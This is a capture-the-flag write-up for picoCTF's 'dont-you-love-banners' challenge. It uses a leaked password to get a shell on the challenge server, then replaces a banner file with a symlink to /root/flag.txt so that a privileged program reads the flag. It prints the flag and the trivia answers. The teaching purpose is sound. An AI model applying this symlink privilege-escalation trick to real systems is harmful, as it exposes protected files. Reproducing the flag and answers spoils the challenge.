# dont-you-love-banners
| **Platform** | picoCTF 2024 |
| **Category** | General Skills |
| **Difficulty** | Medium |
| **Author** | Loic Shema / syreal |
| **Tags** | Shell, browser_webshell_solvable |

## Challenge
The challenge asks:
```text
Can you abuse the banner?
The server has been leaking some crucial information on tethys.picoctf.net.
Use the leaked information to get to the server.
To connect to the running application use nc tethys.picoctf.net <PORT>.
From the above information abuse the machine and find the flag in the /root directory.
```
The main idea is to use the leaked information from the banner and then abuse a symbolic link to make a privileged program read `/root/flag.txt`.

## Hints
The challenge provides two hints:
```text
1. Do you know about symlinks?
2. Maybe some small password cracking or guessing
```
The important concept for this challenge is a **symbolic link (symlink)**.
## Step 1 – Connect to the Server
First connect to the information-leaking service:
```bash
nc tethys.picoctf.net <LEAK_PORT>
```
The service leaks useful information, including a password.
Use the leaked password to access the main application:
```bash
nc tethys.picoctf.net <APP_PORT>
```
## Step 2 – Answer the Questions
The application asks for the leaked password.
It then asks:
```text
What is the top cyber security conference in the world?
```
Answer:
```text
DEFCON
```
It then asks:
```text
the first hacker ever was known for phreaking(making free phone calls), who was it?
```
Answer:
```text
JOHN DRAPER
```
After answering correctly, we get access to the shell:
```text
player@challenge:~$
```
## Step 3 – Inspect the Files
Check the current directory:
```bash
ls -la
```
There is a file called:
```text
banner
```
Read it:
```bash
cat banner
```
The banner is important because the privileged program reads this file.
## Step 4 – Understand the Vulnerability
The server-side program reads:
```text
/home/player/banner
```
The important behavior is essentially:
```python
with open("/home/player/banner", "r") as f:
    print(f.read())
```
Normally, we cannot directly read:
```text
/root/flag.txt
```
because it belongs to root.
However, Linux symbolic links allow one filename to point to another file.
We can make:
```text
/home/player/banner
```
point to:
```text
/root/flag.txt
```
Then the privileged program will follow the symlink and read the root flag.
## Step 5 – Backup the Original Banner
Rename the existing banner:
```bash
mv banner banner_backup
```
This keeps the original file in case we need it later.
## Step 6 – Create the Symlink
Create a symbolic link named `banner` pointing to the root flag:
```bash
ln -s /root/flag.txt banner
```
Check it:
```bash
ls -l banner
```
The output should look similar to:
```text
banner -> /root/flag.txt
```
Now the file relationship is:
```text
/home/player/banner
        ↓
     symlink
        ↓
/root/flag.txt
```
## Step 7 – Trigger the Privileged Program
Reconnect to the application:
```bash
nc tethys.picoctf.net <APP_PORT>
```
The application reads:
```text
/home/player/banner
```
But `banner` is now a symlink to:
```text
/root/flag.txt
```
Therefore, the privileged program prints the contents of the root flag.
## Why This Works
Directly running:
```bash
cat /root/flag.txt
```
as the `player` user would normally fail because of file permissions.
But the server program has the necessary privileges to read the file.
We control:
```text
/home/player/banner
```
so we replace it with:
```text
banner -> /root/flag.txt
```
When the privileged program opens `banner`, Linux follows the symlink.
This causes the privileged program to read the root-owned flag for us.
## Important Commands
Connect to the first service:

```bash
nc tethys.picoctf.net <LEAK_PORT>
```
Connect to the main application:

```bash
nc tethys.picoctf.net <APP_PORT>
```

List files:

```bash
ls -la
```

Read the banner:

```bash
cat banner
```

Backup the banner:

```bash
mv banner banner_backup
```

Create the symlink:

```bash
ln -s /root/flag.txt banner
```

Verify the symlink:

```bash
ls -l banner
```

Reconnect:

```bash
nc tethys.picoctf.net <APP_PORT>
```

## Flag
```text
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_ed6f9c71}
```

## Tools Used
- Linux Terminal
- Netcat (`nc`)
- `ls`
- `cat`
- `mv`
- `ln`
- Symbolic links

## Key Learning
- Never trust information leaked by a service banner.
- Linux symbolic links can point one filename to another file.
- A privileged program that follows a user-controlled symlink can unintentionally expose protected files.
- File permissions are applied based on the process accessing the target file.
- Understanding Linux files and symlinks is important for CTFs and security testing.

## Final Solution
```text
Connect to the information-leaking server
        ↓
Find the leaked password
        ↓
Connect to the main application
        ↓
Enter the leaked password
        ↓
Answer DEFCON
        ↓
Answer JOHN DRAPER
        ↓
Get the player shell
        ↓
ls -la
        ↓
Find banner
        ↓
cat banner
        ↓
Discover the privileged banner-reading behavior
        ↓
mv banner banner_backup
        ↓
ln -s /root/flag.txt banner
        ↓
ls -l banner
        ↓
Reconnect to the application
        ↓
Privileged program follows the symlink
        ↓
/root/flag.txt is read
        ↓
Flag
```
